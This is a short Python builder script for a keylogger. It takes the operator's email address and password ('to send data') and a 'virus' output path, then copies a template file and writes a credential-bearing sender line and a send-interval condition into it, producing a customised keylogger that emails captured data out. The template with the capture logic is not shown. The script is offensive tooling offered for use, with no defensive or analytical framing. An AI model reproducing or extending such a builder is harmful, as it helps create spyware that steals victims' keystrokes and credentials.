import sys
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('-e', '--email', required=True, action='store', help='Your email to send data')
parser.add_argument('-p', '--passwd', required=True, action='store', help='Password to email')
parser.add_argument('-n', '--name', default='keylogger.py', action='store', help='Virus absolute path')
parser.add_argument('-c', '--count', default='100', action='store', help='???')

(email, password, path, count) = (parser.parse_args().email, parser.parse_args().passwd, parser.parse_args().name, parser.parse_args().count)


counter = 0
with open('template.py', 'r') as template:
	with open(path, 'w') as vir:
		for line in template.readlines():
			counter += 1
			if counter == 44:
				vir.write(f'	s = Sender("{email}", "{password}")\n')
			elif counter == 70:
				vir.write(f'		if COUNT_OF % {count} == 0: #flag')
			else:
				vir.write(line)
